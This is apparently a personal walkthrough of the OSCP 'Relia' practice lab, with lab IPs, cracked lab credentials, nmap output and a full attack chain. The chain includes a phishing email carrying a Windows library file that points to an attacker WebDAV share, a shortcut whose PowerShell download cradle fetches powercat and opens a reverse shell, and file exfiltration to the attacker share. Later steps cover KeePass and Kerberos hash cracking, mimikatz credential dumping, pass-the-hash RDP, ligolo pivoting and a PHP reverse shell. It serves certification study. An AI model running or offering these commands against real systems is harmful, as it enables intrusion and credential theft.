---
title: OSCP Relia - Challengues
author: amandaguglieri
draft: false
TableOfContents: true
Date: 20250903
tags:
  - walkthrough
---

## Description

We are tasked with a penetration test of _Relia_, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and wants now to get an assessment of their IT security. Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.

The organization topology diagram is shown below and the public subnet network resides in the `192.168.xx.0/24` range, where the `xx` of the third octet can be found under the _IP ADDRESS_ field in the control panel.

![[relia_00.png]]

### IPs

```
172.16.111.6
172.16.111.7
172.16.111.21
172.16.111.19
172.16.111.15
172.16.111.30
172.16.111.14
172.16.111.20
192.168.151.249
192.168.151.248
192.168.151.247
192.168.151.246
192.168.151.245
192.168.151.191
192.168.151.189
192.168.151.250 
```

### Machines

```
export vm1=172.16.111.6
export vm15=172.16.111.7

export vm14=192.168.151.249
export vm13=192.168.151.248
export vm12=192.168.151.247
export vm11=192.168.151.246
export vm10=192.168.151.245

export vm9=172.16.111.21
export vm7=172.16.111.19
export vm6=172.16.111.15
export vm5=172.16.111.30
export vm4=172.16.111.14

export vm3=192.168.151.191
export vm2=192.168.151.189
export WINPREP=192.168.151.250 
export vm8=172.16.111.20
```

Ordered

```
export vm1=172.16.111.6
export vm2=192.168.151.189
export vm3=192.168.151.191
export vm4=172.16.111.14
export vm5=172.16.111.30
export vm6=172.16.111.15
export vm7=172.16.111.19
export vm8=172.16.111.20
export vm9=172.16.111.21
export vm10=192.168.151.245
export vm11=192.168.151.246
export vm12=192.168.151.247
export vm13=192.168.151.248
export vm14=192.168.151.249
export vm15=172.16.111.7
export WINPREP=192.168.151.250 
```




**172.16.111.6**

Challenge 2 - VM 1 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.111.7**

Challenge 2 - VM 15 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.151.249**

Challenge 2 - VM 14 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.151.248**

Challenge 2 - VM 13 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.151.247**

Challenge 2 - VM 12 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.151.246**

Challenge 2 - VM 11 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.151.245**

Challenge 2 - VM 10 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.111.21**

Challenge 2 - VM 9 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.111.19**

Challenge 2 - VM 7 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.111.15**

Challenge 2 - VM 6 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.111.30**

Challenge 2 - VM 5 OS Credentials:

```
No credentials were provided for this machine
```

**172.16.111.14**

Challenge 2 - VM 4 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.151.191**

Challenge 2 - VM 3 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.151.189**

Challenge 2 - VM 2 OS Credentials:

```
No credentials were provided for this machine
```

**192.168.151.250**

Challenge 2 - WINPREP OS Credentials:

```
offsec / lab
```

**172.16.111.20**

Challenge 2 - VM 8 OS Credentials:

```
No credentials were provided for this machine
```

### Generic nmap

External:

```
nmap $vm10/24
```

Output:

```
Nmap scan report for 192.168.151.189
Host is up (0.039s latency).
Not shown: 992 closed tcp ports (reset)

PORT     STATE SERVICE
25/tcp   open  smtp
110/tcp  open  pop3
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
587/tcp  open  submission
5985/tcp open  wsman

Nmap scan report for 192.168.151.191
Host is up (0.042s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 192.168.151.245
Host is up (0.043s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
443/tcp  open  https
2222/tcp open  EtherNetIP-1
8000/tcp open  http-alt

Nmap scan report for 192.168.151.246
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
2222/tcp open  EtherNetIP-1

Nmap scan report for 192.168.151.247
Host is up (0.038s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 192.168.151.248
Host is up (0.037s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 192.168.151.249
Host is up (0.041s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8000/tcp open  http-alt

Nmap scan report for 192.168.151.250
Host is up (0.053s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 192.168.151.254
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp filtered ssh
53/tcp open     domain

```


```
Nmap scan report for 172.16.111.5
Host is up (0.00040s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
110/tcp  open  pop3
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
587/tcp  open  submission
5985/tcp open  wsman


Nmap scan report for 172.16.111.5
Host is up (0.00040s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
110/tcp  open  pop3
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
143/tcp  open  imap
445/tcp  open  microsoft-ds
587/tcp  open  submission
5985/tcp open  wsman

Nmap scan report for 172.16.111.6
Host is up (0.0060s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 172.16.111.7
Host is up (0.00054s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
3389/tcp open  ms-wbt-server


Nmap scan report for 172.16.111.14
Host is up (0.052s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.111.15
Host is up (0.00021s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 172.16.111.19
Host is up (0.00019s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 172.16.111.20
Host is up (0.047s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh


Nmap scan report for 172.16.111.21
Host is up (0.00031s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman


Nmap scan report for 172.16.111.30
Host is up (0.00044s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap scan report for 172.16.111.254
Host is up (0.053s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman

```

### users



Keepass file in vm13 - 192.168.151.248

```
# Keepass file in vm13 - 192.168.151.248 Notes: Backup Operator
bo:Luigi=Papal1963 


# vm10
offsec
miranda
steven
mark
anita
adrian
damon
SC_Apache2.4
```


```
RosemaryBush1!
```

```
# vm8
michelle:NotMyPassword0k?

# vm14
damon:i6yuT6tym@

# vm14
maildmz@relia.com:DPuBT9tGCBrTbR

# vm12 
mark:OathDeeplyReprieve91

# vm13 
dmzadmin:SlimGodhoodMope
bo:Luigi=Papal1963 


```


##  [ COMPROMISED  7]  vm2 - 192.168.151.189
Command:

```bash
nmap -sC -sV 192.168.151.189
```

Output:

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:22 EST
Nmap scan report for 192.168.151.189
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: OK NAMESPACE IDLE CHILDREN ACL completed CAPABILITY SORT IMAP4rev1 IMAP4 QUOTA RIGHTS=texkA0001
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-21T17:48:40
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 26m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.93 seconds
```


### local.txt

After running the nmap script on port 25, we see a mail relay vulnerability that we will abuse: 

**Step 1: Set up a webdav server**

[See webdav](webdav-wsgidav.md)

Create a folder to serve from there:

```bash
mkdir /home/kali/webdav

cd /home/kali/webdav

wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/webdav --auth=anonymous 
```

**Step 2: Create a config.Library-ms** 

Open Visual Studio and create an empty file named config.Library-ms .

Enter the following content for the file:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.152</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Opening this microsoft library in a Windows, it will open a explorer windows connected to our share.

If we re-open our file in Visual Studio Code, we find that a new tag appeared named [serialized](https://docs.microsoft.com/en-us/windows/win32/search/search-schema-sconn-simplelocation).  The tag contains base64-encoded information about the location of the url  tag. Additionally, the content inside the  url  tags has changed from http://192.168.45.152  to \\192.168.45.152\DavWWWRoot. Windows tries to optimize the WebDAV connection information for the [Windows WebDAV client](https://www.webdavsystem.com/server/access/windows) and therefore modifies it.

**Step 3: Create a malicious shortcut**

The shortcut will contain the following command:

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.152:8000/powercat.ps1'); powercat -c 192.168.45.152 -p 4444 -e powershell"

```

Right click in the Windows Desktop and select Create New Shortcut. Place the command in the Location of the item:

![[mslibrary.png]]


Give it a name: 

![[mslibrary2.png]]

As later on in our webdav server we will see the request to 

```html
GET /automatic_configuration.lnk
```

We will name the malicious link like that.

**Step 4: Transfer the config.Library-ms and the malicious shortcut to your webdav server**

Use whatever technique for file transfer the malicious files  config.Library-ms  and automatic_configuration.lnk to your kali, where the webdav server is in use. A convenient way is copying-pasting in the webdav share the two files.

We now have a our web dav server with both files.

**Step 5: Prepare the setup**

**On one side**, we have the automatic_configuration.lnk downloading powercat.ps1 from our kali:8000 and then we have the same file launching the execution of a reverse shell:

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.152:8000/powercat.ps1'); powercat -c 192.168.45.152 -p 4444 -e powershell"
```

So we need, a http listener in port 8000 serving powercat.ps1:

```
python -m http.server 80000
```

A netcat listener ready to receive a  connection in port 4444:

```bash
nc -lnvp 4444
```


**Step 6: Deliver the malicious windows library file to the victim**


```
sudo swaks -t jim@relia.com --from mark@relia.com -ap --attach @config.Library-ms --server 192.168.151.189 --body test.txt --header "Subject: Urgent Configuration Setup" --suppress-data
```

And we had "maildmz:DPuBT9tGCBrTbR" from $VM14

So we print the local.txt in Jim's Desktop.

90e8f1fc02705f8cd086ee76f99bd34a

After running ipconfig /all we noticed that we are not a VM2 192.168.151.189, but at VM4 172.16.111.14


### proof.txt

Just go to C:\Users\offsec\Desktop and proof.txt is there.


### Post-exploitation

Notice the C:\Users\jim\Documents\Database.kdbx file 

In our kali: 

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

Now we can attempt to connect to the share using the `DavWWWRoot` directory.

```powershell
# DavWWWRoot is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. 
# Upload files with SMB
copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.152\DavWWWRoot\
```


```bash
keepass2john Database.kdbx
```

Output:

```
Database:$keepass$*2*60*0*ed890395c5503e50453897e48fd2d79ece2ae3466b51b6fb941cd413f5c89b43*3edacb91f15bae05d3fd546f201cd8924676b662f6101ba57155e0f4aeae9b61*7a963146ec300519645fbc90ca4e258d*90939579da95cd23a9c90aef5a7a507d7c9ee647ed47c0fa05729a1262d7d73e*e97f9fe2f7a1efe24b054dfcb47e8edab5dd7eb96c5731f32e64a9d3a1db5dcf
```

Save as keepass_hash the following:

```text
$keepass$*2*60*0*ed890395c5503e50453897e48fd2d79ece2ae3466b51b6fb941cd413f5c89b43*3edacb91f15bae05d3fd546f201cd8924676b662f6101ba57155e0f4aeae9b61*7a963146ec300519645fbc90ca4e258d*90939579da95cd23a9c90aef5a7a507d7c9ee647ed47c0fa05729a1262d7d73e*e97f9fe2f7a1efe24b054dfcb47e8edab5dd7eb96c5731f32e64a9d3a1db5dcf
```

Crack:

```bash
hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt

```

Output: mercedes1

And now we open the file and retrieve passwords

```
jim@relia.com:Castello1!
dmzadmin:SlimGodhoodMope
```

Go to machine VM3 with dmzadmin:SlimGodhoodMope
Go to machine VM9  with jim@relia.com:Castello1!

```bash
nxc smb 172.16.111.6/24 -u jim -p 'Castello1!' --shares
```

returned:

```
172.16.111.7    445    INTRANET         
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC

172.16.111.21   445    FILES      
Share           Permissions     Remark
ADMIN$                          Remote Admin
apps            READ            
C$                              Default share
IPC$            READ            Remote IPC
monitoring                      
scripts                  
  
172.16.111.30   445    WEBBY            
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


172.16.111.15   445    WK02             
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


172.16.111.6    445    DC02             
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share

172.16.111.254  445    LOGIN            
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


172.16.111.5    445    MAIL             
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC


172.16.111.14   445    WK01             
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
IPC$            READ            Remote IPC

```

##   [ COMPROMISED  8]  vm3 - 192.168.151.191 - 172.16.111.254


### local.txt + proof.txt

Also in 172.16.111.254
Command:

```bash
nmap -sC -sV 192.168.151.191
```

Output:

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-21 12:22 EST
Nmap scan report for 192.168.151.191
Host is up (0.035s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.151.191
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-21T17:48:58+00:00
|_ssl-date: 2025-12-21T17:49:06+00:00; +26m01s from scanner time.
| ssl-cert: Subject: commonName=login.relia.com
| Not valid before: 2025-11-12T22:37:57
|_Not valid after:  2026-05-14T22:37:57
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-21T17:48:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 26m00s, deviation: 0s, median: 26m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.02 seconds
```

Coming from machine VM2


```bash
xfreerdp3 /v:192.168.151.191:3389 /u:dmzadmin /p:SlimGodhoodMope
```

Open a cmd as Administrator. Drag the psexec64.exe:

```bash
.\PsExec64.exe  -s  cmd.exe
```

We are NT authority /system.

```
.\mimikatz.exe

# Impersonate as NT Authority/SYSTEM (having permissions for it).
token::elevate

# List users and hashes of the machine
lsadump::sam
```


Output:

```
Administrator:b0628840403a01ce55a9d57dc4fb4640
dmzadmin:ae78a6fea976b71e09e99b903020af6


```

### Post exploitation:

**Restricted Admin Mode**, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.

```
xfreerdp3 /v:192.168.151.191 /u:Administrator /pth:'b0628840403a01ce55a9d57dc4fb4640'
```


Get  roastable users in the machine:

```powershell
# Retrieving AS-REP in Proper Format using Rubeus
.\Rubeus.exe asreproast /nowrap 
```

Output: 

```text
$krb5asrep$michelle@relia.com:be1c6023eb0425d5a3cbaea959da57d3$933d07b8c3823efa66c59d30e6bf65b7e6de843e1fda710634eb522cc9433257dfd4cbd1a18ad5943c22fc51846e8e6f3340b56416a647857361eb970d5d202c192371994ce93d9b6de707502c532b2a7822607eae40a6e2c491e0225ee24ef2c2eedf05ef97f81b7a8286c93dc8537eb2e64b5ee73bc8bf86ac9661d76016ea01350febdbbe00ca8d348553486ab1ea2846b73113727e2ee58c0c55f747dfc6cefe61c403ed5f4624d05f6a27dc6913d41585fefbeb3110bd800554a69482bf25a32d97949c1db5effd989d3e1be2fd3b32466534eceecf3a0634157594c038a9199916b545
```

Cracking the Hash Offline with Hashcat:

```bash
hashcat -m 18200 michelle.txt /usr/share/wordlists/rockyou.txt 
```


```
michelle:NotMyPassword0k?
```



### Pivoting

Access to the pivot machine:

```bash
xfreerdp3 /v:192.168.151.191:3389 /u:dmzadmin /p:SlimGodhoodMope
```

We copy paste the ligolo agent to the Administrator's Desktop (ligolo-ng-agent-windows_amd64.exe)

In our kali, we need to create a tun interface:

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

Second, start the proxy:

```bash
./ligolo-ng-proxy-linux_amd64 -selfcert 
```

Third, connect the agent (in the pivot machine) to our proxy in the kali:

```powershell
.\ligolo-ng-agent-windows_amd64.exe -connect 192.168.45.169:11601 --ignore-cert

```

Once you start the proxy, it listens on the port “11601” by default. So when you connect to your proxy, you need to specify your IP and that default port (unless other configurations are in place).

Commands in ligolo:

```
# List available sessions
session
# To enter one of them, enter the number they have.

# Add a route to the new interface (in a new kali terminal)
sudo ip route add 240.0.0.1/32 dev ligolo
sudo ip route add 172.16.111.0/24 dev ligolo
# Start the tunnel
start
```

The key part is 

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
sudo ip route add 172.16.111.0/24 dev ligolo
```

Now, all we have to do now is enumerate from our kali

```
nxc rdp 172.16.111.6/24 -u michelle -p 'NotMyPassword0k?'
```

Output: 

```bash
RDP         172.16.111.254  3389   LOGIN            [*] Windows 10 or Windows Server 2016 Build 20348 (name:LOGIN) (domain:relia.com) (nla:True)
RDP         172.16.111.14   3389   WK01             [*] Windows 10 or Windows Server 2016 Build 22000 (name:WK01) (domain:relia.com) (nla:True)
RDP         172.16.111.6    3389   DC02             [*] Windows 10 or Windows Server 2016 Build 20348 (name:DC02) (domain:relia.com) (nla:True)
RDP         172.16.111.30   3389   WEBBY            [*] Windows 10 or Windows Server 2016 Build 20348 (name:WEBBY) (domain:relia.com) (nla:True)
RDP         172.16.111.15   3389   WK02             [*] Windows 10 or Windows Server 2016 Build 22000 (name:WK02) (domain:relia.com) (nla:True)
RDP         172.16.111.254  3389   LOGIN            [+] relia.com\michelle:NotMyPassword0k?
RDP         172.16.111.14   3389   WK01             [+] relia.com\michelle:NotMyPassword0k?
RDP         172.16.111.7    3389   INTRANET         [*] Windows 10 or Windows Server 2016 Build 20348 (name:INTRANET) (domain:relia.com) (nla:False)
RDP         172.16.111.6    3389   DC02             [+] relia.com\michelle:NotMyPassword0k?
RDP         172.16.111.30   3389   WEBBY            [+] relia.com\michelle:NotMyPassword0k?
RDP         172.16.111.15   3389   WK02             [+] relia.com\michelle:NotMyPassword0k?
RDP         172.16.111.7    3389   INTRANET         [+] relia.com\michelle:NotMyPassword0k? (Pwn3d!)
```

The user michelle is  Admin in the machine 172.16.111.7. Go to that machine.


## vm1 - 172.16.111.6
Command:

```bash
nmap -sC -sV 172.16.111.6
```

Output:

```txt
Nmap scan report for 172.16.111.6
Host is up (0.13s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-04 17:21:25Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: relia.com0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC02.relia.com
| Not valid before: 2026-01-03T16:34:01
|_Not valid after:  2026-07-05T16:34:01
|_ssl-date: 2026-01-04T17:22:13+00:00; +29m10s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: DC02
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: DC02.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-04T17:21:33+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC02; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:07:59 (VMware)
|_clock-skew: mean: 29m09s, deviation: 0s, median: 29m09s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-04T17:21:33
|_  start_date: N/A

```



```

```


```

```

Output:

```

```


```bash

```

Output:

```

```


```bash

```

Output:

```

```


## [ COMPROMISED ] vm15 - 172.16.111.7


```
nmap -sC -sV 172.16.111.7 
```


```
Nmap scan report for 172.16.111.7
Host is up (0.046s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was http://172.16.111.7/wordpress/
|_http-generator: WordPress 6.0.3
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
|_http-generator: WordPress 6.0.3
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| http-title: RELIA INTRANET &#8211; Just another WordPress site
|_Requested resource was https://172.16.111.7/wordpress/
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.23 or earlier (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: INTRANET
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: INTRANET.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-04T17:09:12+00:00
| ssl-cert: Subject: commonName=INTRANET.relia.com
| Not valid before: 2026-01-03T16:34:34
|_Not valid after:  2026-07-05T16:34:34
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 29m09s, deviation: 0s, median: 29m09s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-04T17:09:12
|_  start_date: N/A
|_nbstat: NetBIOS name: INTRANET, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:a2:17 (VMware)

```

### local.txt

It comes from VM3

```
xfreerdp3 /v:172.16.111.7 /u:michelle /p:'NotMyPassword0k?'
```

The C:\XAMPP folder is writable by my user. Create a pentestMonkey reverse shell under the wordpress installation. Set a listener in the kali and trigger the shell via browser. It will be a NT SYSTEM. Copy in the wordpress folder mimikatz.

```powershell
token::elevate
lsadump::sam
```

Output:

```
Administrator:8b4547a5116dd13e6e206d1286a06b28
```

### proof.txt

Still, from the reverse shell with NT SYSTEM modfy the registry:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp3 /v:172.16.111.7 /u:Administrator /pth:'8b4547a5116dd13e6e206d1286a06b28'
```

Run lazagne.exe

Output:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8b4547a5116dd13e6e206d1286a06b28:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9756266d27a75c923beb3c8c654b31d4:::
```


Now, as we have a foothold on the domain we will enumerate with bloodhound to have a first pic on the users, paths, etc of relia.com. Remember our /etc/host file contains the following:

```text
172.16.111.7     intranet.relia.com
172.16.111.6     DC02.relia.com relia.com

```

And the krb5.conf file is 

```
[libdefaults]
  default_realm = RELIA.COM
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
